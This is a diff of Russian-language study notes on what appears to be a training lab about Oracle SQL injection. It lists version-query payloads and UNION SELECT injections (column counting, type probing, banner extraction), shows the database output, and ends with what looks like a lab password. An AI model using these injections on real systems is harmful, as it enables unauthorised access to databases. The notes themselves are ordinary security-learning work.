@@ -11,11 +11,13 @@ You can query the database to determine its type and version. This information i
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 
 
+```c
 |Oracle|               SELECT banner FROM v$version 
 |Oracle|               SELECT version FROM v$instance 
 |Microsoft|         SELECT @@version   
 |PostgreSQL|     SELECT version()       
-|MySQL|              SELECT @@version         
+|MySQL|              SELECT @@version  
+```       
 
 
 ПОПРОБОВАЛ ВСЕ ВАРИАНТЫ ВЫШЕ на все запросы ответ 500 с ошибкой просто
@@ -87,25 +89,32 @@ You can query the database to determine its type and version. This information i
 
 потом потпробовал запрос классический 
 определил что 2 столбца
+```sql
 'ORDER+BY+2--
+```
 
 потом  изучаю типы для вывода
+```sql
 'UNION+SELECT+NULL,+NULL+FROM+DUAL--
+```
 
 gпервый столбец стринт - подходит
+```sql
 'UNION+SELECT+'f',+NULL+FROM+DUAL--
+```
 
 (вывел f) в ответе
 
 
-  <img src="../../assets/Снимок-19.26.19.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+<img src="../../assets/Снимок-19.26.19.png" alt="Скрин" style="width: 90%;" />
 
 
-
+```
 
 
 теперь нужно вывести инфу о типе бд
 
+```sql
 select+version+from+v$instance
 SELECT+banner+FROM+v$version 
 
@@ -121,26 +130,39 @@ banner FROM v$version
 но вывелась только строка banner FROM v$version
 
 ' UNION SELECT banner, NULL FROM v$version--
-
+```
 успех !
-🟢'UNION+SELECT+banner,+NULL+FROM+v$version--  
+```sql
+🟢'UNION+SELECT+banner,+NULL+FROM+v$version-- 
+```
 в ответе: TNS for Linux: Version 11.2.0.2.0 - Production
 
+```sql
 🟢 'UNION+ALL+SELECT+banner,+NULL+FROM+v$version--
+```
 ответ
+```http
 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 PL/SQL Release 11.2.0.2.0 - Production
 CORE	11.2.0.2.0	Production
 TNS for Linux: Version 11.2.0.2.0 - Production
 NLSRTL Version 11.2.0.2.0 - Production
+```
 
 ВЫПОЛНЕНО! 
 
-'UNION+ALL+SELECT+banner,+NULL+FROM+v$version-- вывело все сразу!
+```sql
+'UNION+ALL+SELECT+banner,+NULL+FROM+v$version-- 
+```
+вывело все сразу!
 
-'UNION+SELECT+banner,+NULL+FROM+v$version-- вывело только линукс!
+```sql
+'UNION+SELECT+banner,+NULL+FROM+v$version-- 
+```
+вывело только линукс!
 
 ==ALL было ключевое==
 
-вывод, слип не работал но сработал, но сработал  'order+by+1--
-wWigefieivj
+вывод, слип не работал но сработал, но сработал  `'order+by+1--`
+
+пароль  - wWigefieivj
